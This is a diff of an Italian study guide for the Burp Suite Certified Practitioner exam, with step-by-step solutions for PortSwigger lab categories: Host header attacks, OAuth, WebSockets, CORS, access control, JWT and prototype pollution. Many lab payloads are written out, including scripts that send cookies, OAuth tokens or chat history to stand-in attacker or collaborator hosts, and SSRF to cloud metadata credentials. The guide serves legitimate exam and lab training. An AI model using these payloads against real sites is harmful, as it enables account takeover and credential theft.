+- Soluzione: Intruder su `current-password` con `username=carlos` e le due nuove password impostate su valori **diversi**; aggiungi una Grep match su `New passwords do not match`: l'unica risposta che la contiene rivela la password corrente di carlos.
+- Payload (nuove password diverse, bruteforce della corrente):
+```
+username=carlos&current-password=§incorrect-password§&new-password-1=123&new-password-2=abc
+```
 - Link: [Password brute-force via password change](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)
 - Step: 2
 
+## HTTP Host header attacks — Stage tipico: 1-2
+
+**Come riconoscerla (generale):** manda un `Host` arbitrario e verifica se la richiesta raggiunge comunque l'app (nessun "Invalid Host"); controlla se il valore viene riflesso in URL generati dinamicamente (reset password, redirect, import di script) o usato per instradare la richiesta a un backend interno.
+
+**1. Web cache poisoning via richieste ambigue (Host header)**
+
+- Segnale: l'app valida il Host header (modificarlo blocca l'accesso), ma se aggiungi un **secondo** header `Host` quello viene ignorato dal routing/validazione mentre il suo valore viene riflesso nell'URL assoluto usato per importare `/resources/js/tracking.js`. Header di cache verbosi indicano quando è `hit` e l'`Age`.
+- Soluzione: ospitare sull'exploit server un file allo stesso path (`/resources/js/tracking.js`) col payload; con un cache-buster, inviare la richiesta con un secondo `Host` puntato all'exploit server fino a ottenere un `hit`, poi togliere il cache-buster per avvelenare la home pulita.
+- Payload (file `/resources/js/tracking.js` sull'exploit server = `alert(document.cookie)`; richiesta con doppio Host):
+```
+GET /?cb=123 HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
+```
+- Payload da esame (Burp Collaborator/OAST): nel corpo del file JS sull'exploit server, esfiltra il cookie.
+```javascript
+document.location='https://OASTIFY.COM/?c='+document.cookie
+```
+- Link: [Web cache poisoning via ambiguous requests](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests)
+- Step: 1
+
+**2. Routing-based SSRF**
+
+- Segnale: un middleware/reverse proxy interno instrada in base al Host header senza validarlo. Inserendo nel Host un payload Burp Collaborator e facendo "Poll now" ricevi una interazione HTTP/DNS: conferma che puoi far emettere richieste arbitrarie al middleware.
+- Soluzione: con Intruder (disattiva "Update Host header to match target") fai scanning del range interno `Host: 192.168.0.§0§` (Numbers 0–255) finché una risposta dà `302` verso `/admin`; accedi a `/admin`, poi replica a mano la POST di cancellazione utente (serve il token CSRF letto dalla risposta + il session cookie).
+- Payload (conferma SSRF — valore del Host header):
+```
+Host: BURP-COLLABORATOR-SUBDOMAIN
+```
+- Payload (scan del pannello interno in Intruder):
+```
+Host: 192.168.0.§0§
+```
+- Payload (cancella carlos: costruisci `GET /admin/delete?csrf=...&username=carlos` con csrf+cookie presi dalla risposta, poi "Change request method" → POST):
+```
+GET /admin/delete?csrf=TOKEN-DALLA-RISPOSTA&username=carlos HTTP/1.1
+Host: 192.168.0.X
+```
+- Link: [Routing-based SSRF](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf)
+- Step: 1
+
+**3. SSRF via parsing errato della richiesta**
+
+- Segnale: l'app valida il Host header e blocca le modifiche, ma accetta anche un **URL assoluto nella request-line**; in quel caso valida l'URL assoluto e non più il Host header, che diventa controllabile (un Host arbitrario dà timeout invece di blocco). È sfruttabile per SSRF routing-based.
+- Soluzione: usare l'URL assoluto nella request-line e mettere nel Host header il target interno; conferma con Collaborator, poi scanna `192.168.0.0/24`, appendi `/admin` all'URL assoluto per accedere al pannello e infine cancella carlos (csrf + cookie, poi POST).
+- Payload (conferma SSRF via middleware):
+```
+GET https://YOUR-LAB-ID.web-security-academy.net/ HTTP/1.1
+Host: BURP-COLLABORATOR-SUBDOMAIN
+```
+- Payload (scan + accesso al pannello: metti il target interno nel Host, poi appendi `/admin` all'URL assoluto):
+```
+GET https://YOUR-LAB-ID.web-security-academy.net/admin HTTP/1.1
+Host: 192.168.0.X
+```
+- Payload (cancella carlos: `/admin/delete?csrf=...&username=carlos`, poi "Change request method" → POST):
+```
+GET https://YOUR-LAB-ID.web-security-academy.net/admin/delete?csrf=TOKEN-DALLA-RISPOSTA&username=carlos HTTP/1.1
+Host: 192.168.0.X
+```
+- Variante (trick `@`): se il proxy costruisce l'URL upstream concatenando `http://backend` + path, un path che inizia con `@` fa interpretare `backend` come userinfo e dirotta l'host: `GET @192.168.0.X/admin HTTP/1.1` → `http://backend@192.168.0.X/admin`.
+- Link: [SSRF via flawed request parsing](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing)
+- Step: 1
+
+**4. Bypass della validazione dell'host tramite attacco sullo stato della connessione**
+
+- Segnale: il front-end valida rigorosamente solo la *prima* richiesta di una connessione HTTP/1.1 riutilizzata, assumendo (erroneamente) che Host e validazione valgano per tutte le richieste successive sulla stessa connessione.
+- Soluzione: in Repeater, raggruppare due richieste e usare "Send group in sequence (single connection)" con `Connection: keep-alive`: la 1ª richiesta ha un Host valido (passa la validazione), la 2ª sulla stessa connessione usa `Host: 192.168.0.1` e path `/admin` (non più validata). Poi replica la POST di cancellazione utente.
+- Payload (1ª richiesta valida, poi 2ª sulla stessa connessione):
+```
+GET / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Connection: keep-alive
+```
+```
+GET /admin HTTP/1.1
+Host: 192.168.0.1
+Connection: keep-alive
+```
+- Payload (cancella carlos — 2ª richiesta del gruppo, csrf+cookie dalla risposta del pannello):
+```
+POST /admin/delete HTTP/1.1
+Host: 192.168.0.1
+Cookie: session=YOUR-SESSION-COOKIE
+Content-Type: application/x-www-form-urlencoded
+Content-Length: CORRECT
+
+csrf=YOUR-CSRF-TOKEN&username=carlos
+```
+- Link: [Host validation bypass via connection state attack](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack)
+- Step: 2
+
+## OAuth authentication — Stage tipico: 1-2
+
+**Come riconoscerla (generale):** con Burp intercetta il flusso "login with social"; individua la richiesta a `/authorization` (parametri `client_id`, `redirect_uri`, `response_type`, `state`) e il callback con `code`/`token`; controlla se `state` è assente (CSRF), come viene validato `redirect_uri`, e se la registrazione dinamica del client è aperta.
+
+**1. SSRF via registrazione dinamica OpenID (dynamic client registration)**
+
+- Segnale: da `/.well-known/openid-configuration` trovi l'endpoint di registrazione client (es. `/reg`), che accetta registrazioni **senza autenticazione**. La pagina "Authorize" mostra il logo del client, preso da `/client/CLIENT-ID/logo`: il suo URL è controllabile via la proprietà `logo_uri` in registrazione → SSRF.
+- Soluzione: registrare un client con `logo_uri` puntato al target interno; poi richiedere `GET /client/CLIENT-ID/logo` per far recuperare quell'URL al server OAuth e leggerne la risposta (le credenziali cloud). Prima conferma l'SSRF con un `logo_uri` = Collaborator.
+- Payload (registra il client con `logo_uri` sul target metadata):
+```
+POST /reg HTTP/1.1
+Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
+Content-Type: application/json
+
+{
+    "redirect_uris": ["https://example.com"],
+    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
+}
+```
+- Payload (triggera il fetch SSRF e leggi la risposta — usa il `client_id` ricevuto):
+```
+GET /client/CLIENT-ID/logo HTTP/1.1
+Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
+```
+- Payload da esame (Burp Collaborator/OAST): per confermare l'SSRF prima del target reale, registra con `"logo_uri": "https://BURP-COLLABORATOR-SUBDOMAIN"` e verifica l'interazione HTTP.
+- Link: [SSRF via OpenID dynamic client registration](https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration)
+- Step: 1
+
+**2. Forced OAuth profile linking (manca il parametro `state`)**
+
+- Segnale: l'app permette di collegare un profilo social a un account esistente; la richiesta `GET /oauth-linking?code=...` **non ha il parametro `state`** (nessuna protezione CSRF).
+- Soluzione: avvia il "attach a social profile" col *tuo* account social, intercetta il `GET /oauth-linking?code=...`, copia l'URL e **droppa** la richiesta (così il `code` resta valido); servi alla vittima (admin) un iframe con quell'URL: il suo browser completa il linking col *tuo* profilo social sull'account admin. Poi "Log in with social media" → sei admin → elimina carlos.
+- Payload (iframe servito all'admin dall'exploit server, con il `code` non consumato):
+```html
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>
+```
+- Link: [Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)
+- Step: 2
+
+**3. OAuth account hijacking via redirect\_uri**
+
+- Segnale: il server OAuth **non valida** `redirect_uri` nella `GET /auth?client_id=...`: puoi impostare un dominio arbitrario e il `code` ci viene inviato.
+- Soluzione: servire alla vittima (sessione OAuth attiva) un iframe che avvia il flusso con `redirect_uri` = tuo exploit server; dall'access log leggi il `code` dell'admin; poi usalo sul callback reale dell'app per loggarti come admin ed eliminare carlos.
+- Payload (iframe sull'exploit server che fa leakare il `code` dell'admin):
+```html
+<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
+```
+- Payload (usa il `code` rubato sul callback reale → login come admin):
+```
+https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE
+```
+- Link: [OAuth account hijacking via redirect\_uri](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)
+- Step: 2
+
+**4. Furto di access token OAuth via open redirect**
+
+- Segnale: flusso implicit (`response_type=token`, token nel fragment). `redirect_uri` è su whitelist ma accetta `/../` (directory traversal); sull'app esiste un open redirect (es. `GET /post/next?path=...`). Concatenando i due, il token nel fragment finisce sul tuo dominio.
+- Soluzione: costruire un URL di autorizzazione dove `redirect_uri` usa il traversal per raggiungere l'open redirect (`/oauth-callback/../post/next?path=EXPLOIT`); un script sull'exploit server estrae il fragment e lo esfiltra; infine usa il token rubato come `Authorization: Bearer` su `GET /me` per ottenere l'API key dell'admin.
+- Payload (URL malevolo che concatena traversal + open redirect):
+```
+https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email
+```
+- Payload (script `/exploit` sull'exploit server: forza il flusso e poi esfiltra il token dal fragment):
+```html
+<script>
+    if (!document.location.hash) {
+        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
+    } else {
+        window.location = '/?'+document.location.hash.substr(1)
+    }
+</script>
+```
+- Payload (usa il token rubato per leggere i dati/API key dell'admin):
+```
+GET /me HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Authorization: Bearer STOLEN-ACCESS-TOKEN
+```
+- Link: [Stealing OAuth access tokens via an open redirect](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)
+- Step: 2
+
+## WebSockets — Stage tipico: 1-2
+
+**Come riconoscerla (generale):** apri Burp Proxy > WebSockets history mentre usi la funzionalità dell'app; intercetta/modifica i messaggi WS con Burp Proxy/Repeater; qualsiasi vulnerabilità HTTP classica (XSS, SQLi, ecc.) può presentarsi anche nei messaggi WS, e l'handshake stesso (fatto via HTTP) può essere vulnerabile a CSRF se si basa solo sui cookie.
+
+**1. Manipolare l'handshake WebSocket per sfruttare una vulnerabilità**
+
+- Segnale: c'è un filtro XSS aggressivo sui messaggi WS; un payload bloccato **banna il tuo IP** e termina la connessione (il "Reconnect" fallisce). L'handshake però accetta `X-Forwarded-For` per spoofare l'IP.
+- Soluzione: in Burp Repeater (o Proxy) manda un payload XSS via messaggio WS per confermare il filtro/ban; poi aggiungi `X-Forwarded-For` all'handshake per riconnetterti da un "nuovo" IP; infine invia un payload **offuscato** (case-mixing + backtick) che bypassa il filtro ed esegue nel browser dell'agente di supporto.
+- Payload (messaggio WS base — viene bloccato, serve a confermare il filtro):
+```
+<img src=1 onerror='alert(1)'>
+```
+- Payload (header da aggiungere all'handshake per riconnettersi aggirando il ban IP):
+```
+X-Forwarded-For: 1.1.1.1
+```
+- Payload (messaggio WS offuscato che bypassa il filtro):
+```
+<img src=1 oNeRrOr=alert`1`>
+```
+- Link: [Manipulating the WebSocket handshake to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities)
+- Step: 1
+
+**2. Cross-site WebSocket hijacking (CSWSH)**
+
+- Segnale: l'handshake WebSocket si autentica **solo tramite cookie di sessione**, senza token CSRF né valori non predicibili; il comando `READY` restituisce la cronologia chat passata.
+- Soluzione: ospitare sull'exploit server una pagina che apre una connessione WS cross-site verso l'app (il browser della vittima invia i cookie automaticamente), invia `READY` e inoltra ogni messaggio ricevuto al tuo collector. Nella chat esfiltrata della vittima si trovano username e password per accedere al suo account.
+- Payload (exploit server; sostituisci l'URL WS — protocollo `wss://` — e il collector):
+```html
+<script>
+    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://OASTIFY.COM', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
+```
+- Link: [Cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)
+- Step: 2
 
 # Stage 2 — Privilege escalation (esecuzione da autenticato)
 
-Categorie tipicamente usate per scalare da un accesso già ottenuto (anche a basso privilegio, spesso fornito direttamente dal lab) a uno più alto — tipicamente colpendo un utente specifico già autenticato (account takeover, admin). **Nota sul CSRF**: ogni lab CSRF fornisce già credenziali valide proprie; l'exploit serve a far compiere un'azione a una vittima già loggata (spesso admin). Non è quindi mai Stage 1 — il foothold è già garantito dal lab stesso. Ordine conforme a [botesjuan/...](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study) (sezione "Privilege Escalation"), tranne Business logic, che non è presente in quel repository ed è aggiunta in coda.
+Categorie tipicamente usate per scalare da un accesso già ottenuto (anche a basso privilegio, spesso fornito direttamente dal lab) a uno più alto — tipicamente colpendo un utente specifico già autenticato (account takeover, admin). **Nota sul CSRF**: ogni lab CSRF fornisce già credenziali valide proprie; l'exploit serve a far compiere un'azione a una vittima già loggata (spesso admin). Non è quindi mai Stage 1 — il foothold è già garantito dal lab stesso. Ordine conforme alla tabella riassuntiva iniziale.
 
 
 ## Cross-site request forgery (CSRF) — Stage tipico: 2
@@ -747,6 +1503,93 @@ Categorie tipicamente usate per scalare da un accesso già ottenuto (anche a bas
 - Soluzione: se controlla il prefisso, registra/usa un dominio dove il sito vulnerabile appare come sottodominio del tuo; se controlla solo la presenza della stringa, metti il dominio del target nella query string della tua pagina exploit (e imposta `Referrer-Policy: unsafe-url` per evitare che il browser tronchi la query string dal Referer).
 - Payload: pagina ospitata su `http://vulnerable-website.com.attacker-website.com/csrf-attack` oppure `http://attacker-website.com/csrf-attack?vulnerable-website.com`, con header di risposta `Referrer-Policy: unsafe-url`
 - Link: [CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)
+- Step: 2
+
+
+## Cross-origin resource sharing (CORS) — Stage tipico: 2
+
+**Come riconoscerla (generale):** manda una richiesta con un header `Origin` arbitrario e guarda se viene riflesso in `Access-Control-Allow-Origin` insieme ad `Access-Control-Allow-Credentials: true` — questo è il segnale di un CORS misconfigurato exploitabile per rubare dati con sessione.
+
+**1. CORS con protocolli non sicuri (insecure protocols) nella whitelist**
+
+- Segnale: l'app comunica solo in HTTPS, ma whitelista (e riflette in `Access-Control-Allow-Origin` con `Access-Control-Allow-Credentials: true`) anche un sottodominio raggiungibile in plain HTTP (es. `http://trusted-subdomain.TARGET`).
+- Soluzione: sfruttare un man-in-the-middle/injection sulla connessione HTTP non cifrata della vittima per iniettare una risposta che fa partire dal browser della vittima una richiesta CORS con credenziali verso l'endpoint HTTPS sensibile, con `Origin: http://trusted-subdomain.TARGET`; la risposta (dati sensibili, es. API key) viene letta dallo script dell'attaccante e inviata al suo server. Nel lab, questo si simula intercettando/rispondendo alla richiesta HTTP della vittima tramite l'exploit server.
+- Payload: pagina che fa `fetch`/XHR con `withCredentials:true` verso `https://TARGET/accountDetails` includendo (via redirect o risposta spoofata) `Origin: http://trusted-subdomain.TARGET`, poi esfiltra `this.responseText` al proprio server
+- Link: [CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
+- Step: 2
+
+
+## Access control vulnerabilities — Stage tipico: 2
+
+**Come riconoscerla (generale):** prova a raggiungere una funzione/risorsa sensibile cambiando URL, metodo HTTP, header o parametri (id, role) con un account a basso privilegio o senza autenticazione; confronta il comportamento di front-end (reverse proxy/WAF) e back-end rispetto a URL, metodo, maiuscole/minuscole e header custom.
+
+**1. Bypass del controllo basato sull'URL**
+
+- Segnale: un proxy/front-end blocca l'accesso a `/admin/...` in base all'URL, ma l'app supporta header non standard come `X-Original-URL` o `X-Rewrite-URL` per determinare l'URL "reale".
+- Soluzione: inviare la richiesta a un URL permesso, aggiungendo l'header che fa puntare l'app alla risorsa protetta.
+- Payload: `POST / HTTP/1.1` con header `X-Original-URL: /admin/deleteUser`
+- Link: [URL-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented)
+- Step: 2
+
+**2. Bypass del controllo basato sul metodo HTTP**
+
+- Segnale: l'accesso a un endpoint sensibile è negato solo per un metodo specifico (es. POST), ma l'app accetta anche altri metodi (es. GET) per eseguire la stessa azione.
+- Soluzione: rifare la stessa richiesta cambiando il metodo HTTP (es. da POST a GET) sullo stesso endpoint.
+- Payload: `GET /admin/deleteUser?username=carlos HTTP/1.1` invece di `POST /admin/deleteUser`
+- Link: [Method-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented)
+- Step: 2
+
+**3. Nessun controllo di accesso su uno step di un processo multi-step**
+
+- Segnale: una funzione sensibile è divisa in più step (es. carica dati utente → invia modifiche → conferma); i primi step sono protetti ma l'ultimo (conferma) no.
+- Soluzione: saltare direttamente all'ultimo step, inviando la richiesta di conferma con i parametri necessari senza passare dai controlli dei primi step.
+- Payload: richiedere direttamente lo step finale (es. `POST /admin/update-user-confirm` con i parametri già pronti per promuovere il proprio utente ad admin), bypassando gli step precedenti protetti
+- Link: [Multi-step process with no access control on one step](https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step)
+- Step: 2
+
+**4. Controllo di accesso basato sul Referer**
+
+- Segnale: la pagina principale `/admin` è protetta correttamente, ma le sotto-pagine (es. `/admin/deleteUser`) controllano solo che l'header `Referer` contenga l'URL di `/admin`.
+- Soluzione: forgiare una richiesta diretta verso la sotto-pagina sensibile impostando manualmente l'header `Referer` con l'URL atteso (completamente controllabile dall'attaccante).
+- Payload: `GET /admin/deleteUser?username=carlos HTTP/1.1` con header `Referer: https://TARGET/admin`
+- Link: [Referer-based access control](https://portswigger.net/web-security/access-control/lab-referer-based-access-control)
+- Step: 2
+
+
+## JWT — Stage tipico: 2
+
+**Come riconoscerla (generale):** un JWT ha 3 parti separate da punti (header.payload.signature), base64url; decodifica header e payload e guarda l'algoritmo (`alg`) e parametri come `jwk`/`jku`/`kid`; la sicurezza dipende *interamente* dalla verifica della firma lato server — modifica il payload (es. `isAdmin:true`) e osserva se il server la accetta comunque.
+
+**1. Chiave di firma debole (brute-force con hashcat)**
+
+- Segnale: l'algoritmo è simmetrico (es. `HS256`), quindi la stessa chiave serve per firmare e verificare; se la chiave è un segreto debole/di default, è bruteforceable offline.
+- Soluzione: estrarre il JWT valido, lanciare `hashcat -a 0 -m 16500 <jwt> <wordlist>` per trovare il secret; una volta trovato, modificare il payload (es. `sub` o `isAdmin`) e firmarlo di nuovo con quel secret (es. via estensione JWT Editor in Burp).
+- Payload: `hashcat -a 0 -m 16500 eyJhbGc...<jwt> wordlist.txt`, poi JWT con `{"sub":"administrator"}` firmato con il secret trovato
+- Link: [JWT authentication bypass via weak signing key](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key)
+- Step: 2
+
+**2. Header injection via parametro `jwk`**
+
+- Segnale: il server accetta un header `jwk` che incorpora direttamente la chiave pubblica da usare per la verifica, senza confrontarla con una whitelist di chiavi fidate.
+- Soluzione: generare una propria coppia di chiavi RSA, modificare il payload del JWT come si vuole, firmarlo con la propria chiave privata, e incorporare la propria chiave pubblica nell'header `jwk` (aggiornando anche `kid` se necessario). Il server userà la chiave che tu stesso hai fornito per "verificare" la firma, che quindi risulterà valida.
+- Payload: header `{"alg":"RS256","jwk":{"kty":"RSA","kid":"...","n":"<tua-chiave-pubblica>","e":"AQAB"}}` + payload modificato, firmato con la propria chiave privata (in Burp: estensione JWT Editor → Attack → Embedded JWK)
+- Link: [JWT authentication bypass via jwk header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection)
+- Step: 2
+
+**3. Header injection via parametro `jku` (JWK Set URL)**
+
+- Segnale: il server recupera la chiave di verifica da un URL indicato nell'header `jku`, senza whitelist rigorosa sui domini fidati.
+- Soluzione: ospitare il proprio JWK Set (array di chiavi JWK) su un URL che controlli (il tuo exploit server), generare una coppia di chiavi, firmare il JWT modificato con la chiave privata, e impostare `jku` sull'URL del tuo JWK Set pubblico.
+- Payload: header `{"alg":"RS256","jku":"https://TUO-exploit-server/jwks.json","kid":"..."}`; `https://TUO-exploit-server/jwks.json` contiene la tua chiave pubblica con lo stesso `kid`
+- Link: [JWT authentication bypass via jku header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)
+- Step: 2
+
+**4. Header injection via parametro `kid` (path traversal)**
+
+- Segnale: il `kid` punta a un file/chiave sul filesystem (o a una entry non sufficientemente validata) e sembra vulnerabile a directory traversal; il server supporta anche algoritmi simmetrici.
+- Soluzione: puntare `kid` a un file noto e vuoto presente su quasi tutti i sistemi Linux (es. `/dev/null`), che letto come chiave corrisponde a una stringa vuota; firmare quindi il JWT modificato con HMAC usando come secret una stringa vuota.
+- Payload: header `{"alg":"HS256","kid":"../../../../../../../dev/null"}` + payload modificato, firmato con secret `""` (stringa vuota)
+- Link: [JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)
 - Step: 2
 
 
@@ -905,181 +1748,6 @@ Quando l'input passa per un parser (es. XML) o è filtrato da un WAF: offusca il
 - Step: 2
 
 
-## JWT — Stage tipico: 2
-
-**Come riconoscerla (generale):** un JWT ha 3 parti separate da punti (header.payload.signature), base64url; decodifica header e payload e guarda l'algoritmo (`alg`) e parametri come `jwk`/`jku`/`kid`; la sicurezza dipende *interamente* dalla verifica della firma lato server — modifica il payload (es. `isAdmin:true`) e osserva se il server la accetta comunque.
-
-**1. Chiave di firma debole (brute-force con hashcat)**
-
-- Segnale: l'algoritmo è simmetrico (es. `HS256`), quindi la stessa chiave serve per firmare e verificare; se la chiave è un segreto debole/di default, è bruteforceable offline.
-- Soluzione: estrarre il JWT valido, lanciare `hashcat -a 0 -m 16500 <jwt> <wordlist>` per trovare il secret; una volta trovato, modificare il payload (es. `sub` o `isAdmin`) e firmarlo di nuovo con quel secret (es. via estensione JWT Editor in Burp).
-- Payload: `hashcat -a 0 -m 16500 eyJhbGc...<jwt> wordlist.txt`, poi JWT con `{"sub":"administrator"}` firmato con il secret trovato
-- Link: [JWT authentication bypass via weak signing key](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key)
-- Step: 2
-
-**2. Header injection via parametro `jwk`**
-
-- Segnale: il server accetta un header `jwk` che incorpora direttamente la chiave pubblica da usare per la verifica, senza confrontarla con una whitelist di chiavi fidate.
-- Soluzione: generare una propria coppia di chiavi RSA, modificare il payload del JWT come si vuole, firmarlo con la propria chiave privata, e incorporare la propria chiave pubblica nell'header `jwk` (aggiornando anche `kid` se necessario). Il server userà la chiave che tu stesso hai fornito per "verificare" la firma, che quindi risulterà valida.
-- Payload: header `{"alg":"RS256","jwk":{"kty":"RSA","kid":"...","n":"<tua-chiave-pubblica>","e":"AQAB"}}` + payload modificato, firmato con la propria chiave privata (in Burp: estensione JWT Editor → Attack → Embedded JWK)
-- Link: [JWT authentication bypass via jwk header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection)
-- Step: 2
-
-**3. Header injection via parametro `jku` (JWK Set URL)**
-
-- Segnale: il server recupera la chiave di verifica da un URL indicato nell'header `jku`, senza whitelist rigorosa sui domini fidati.
-- Soluzione: ospitare il proprio JWK Set (array di chiavi JWK) su un URL che controlli (il tuo exploit server), generare una coppia di chiavi, firmare il JWT modificato con la chiave privata, e impostare `jku` sull'URL del tuo JWK Set pubblico.
-- Payload: header `{"alg":"RS256","jku":"https://TUO-exploit-server/jwks.json","kid":"..."}`; `https://TUO-exploit-server/jwks.json` contiene la tua chiave pubblica con lo stesso `kid`
-- Link: [JWT authentication bypass via jku header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)
-- Step: 2
-
-**4. Header injection via parametro `kid` (path traversal)**
-
-- Segnale: il `kid` punta a un file/chiave sul filesystem (o a una entry non sufficientemente validata) e sembra vulnerabile a directory traversal; il server supporta anche algoritmi simmetrici.
-- Soluzione: puntare `kid` a un file noto e vuoto presente su quasi tutti i sistemi Linux (es. `/dev/null`), che letto come chiave corrisponde a una stringa vuota; firmare quindi il JWT modificato con HMAC usando come secret una stringa vuota.
-- Payload: header `{"alg":"HS256","kid":"../../../../../../../dev/null"}` + payload modificato, firmato con secret `""` (stringa vuota)
-- Link: [JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)
-- Step: 2
-
-
-## Prototype pollution
-
-**Come riconoscerla (generale):** cerca un *source* (URL query/fragment, input JSON, web message) che permette di iniettare una chiave `__proto__` con proprieta nidificate; verifica nella console (`Object.prototype.foo`) se la proprieta è stata aggiunta globalmente; poi cerca un *gadget* (proprieta non definita esplicitamente, usata in un sink pericoloso come `innerHTML`/`eval`/opzioni di child process).
-
-### A. Prototype pollution client-side
-
-**1. DOM XSS via prototype pollution client-side**
-
-- Segnale: un parametro URL permette di iniettare `__proto__[prop]=valore`; la pagina usa una libreria/codice che legge una proprieta non definita esplicitamente e la passa a un sink DOM (es. `innerHTML`).
-- Soluzione: usare DOM Invader (o testare manualmente in console) per trovare il source e il gadget, poi costruire un URL che inquina il prototipo con un payload XSS nella proprieta usata dal gadget.
-- Payload: `?__proto__[transport_url]=data:,alert(1)//` oppure `?__proto__[sourceUrl]=//attacker.com/evil.js`
-- Payload da esame (Burp Collaborator): `?__proto__[transport_url]=data:,document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie//` oppure `?__proto__[sourceUrl]=//attacker.com/evil.js`
-- Link: [DOM XSS via client-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution)
-
-**2. DOM XSS via un vettore alternativo di prototype pollution**
-
-- Segnale: il source classico via query string non funziona, ma esiste un altro vettore (es. URL fragment/hash, oppure notazione a punto invece di parentesi quadre).
-- Soluzione: provare varianti del vettore di injection (`__proto__.prop=val` invece di `__proto__[prop]=val`, oppure iniettare nel fragment `#__proto__[prop]=val`).
-- Payload: `#__proto__[transport_url]=data:,alert(1)//`
-- Payload da esame (Burp Collaborator): `#__proto__[transport_url]=data:,document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie//`
-- Link: [DOM XSS via an alternative prototype pollution vector](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector)
-
-**3. Prototype pollution client-side via sanitizzazione difettosa (bypass)**
-
-- Segnale: l'app rimuove la stringa `__proto__` dall'input, ma lo fa con una sola passata non ricorsiva.
-- Soluzione: annidare la stringa bloccata in modo che, dopo una singola rimozione, resti una sequenza `__proto__` valida.
-- Payload: `?__pro__proto__to__.gadget=payload` (dopo la rimozione di `__proto__` una volta, rimane `__proto__.gadget=payload`)
-- Link: [Client-side prototype pollution via flawed sanitization](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization)
-
-**4. Prototype pollution client-side in librerie di terze parti**
-
-- Segnale: il gadget non è nel codice dell'applicazione ma in una libreria esterna importata; difficile individuarlo leggendo manualmente codice minificato/obfuscato.
-- Soluzione: usare DOM Invader per scansionare automaticamente la pagina (incluse le librerie di terze parti) e identificare source/gadget/PoC XSS generato automaticamente.
-- Payload: dipende dal gadget trovato da DOM Invader nella libreria specifica
-- Link: [Client-side prototype pollution in third-party libraries](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries)
-
-**5. Prototype pollution via API del browser (bypass di `Object.defineProperty`)**
-
-- Segnale: gli sviluppatori hanno difeso una proprieta con `Object.defineProperty(obj, 'gadget', {configurable:false, writable:false})` senza impostare un valore iniziale; oppure il gadget sta in un'opzione non definita passata a `fetch()` (es. `headers`).
